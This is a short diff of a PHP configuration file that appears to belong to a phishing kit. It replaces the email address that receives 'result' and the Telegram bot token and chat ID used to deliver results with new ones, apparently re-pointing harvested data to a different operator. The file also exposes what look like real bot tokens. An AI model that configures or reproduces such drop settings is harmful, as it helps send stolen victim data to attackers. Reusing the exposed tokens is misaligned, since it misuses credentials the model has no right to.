@@ -2,13 +2,13 @@
 
 
 /* Change Email Adress recovery / just to see result :) */
-$Your_Mail = "yahyaxhack32@gmail.com";
+$Your_Mail = "stategrant74@gmail.com";
 /* --------------------------  */
 
 
 /* this is bot telegram :)  */
-$botToken="6287974020:AAGVk-eoXMZFcEPDd7jHrK8FK3n-VMNOI3s";
-$chatId="1661844800";  
+$botToken="6852598880:AAG84qnAirusj2VdeTHGRQ2t5f9ua5ilC2M";
+$chatId="5880441234";  
 /* --------------------------  */
 
 /* If you want two to see the result, If you want to stop , change To off  :)  */
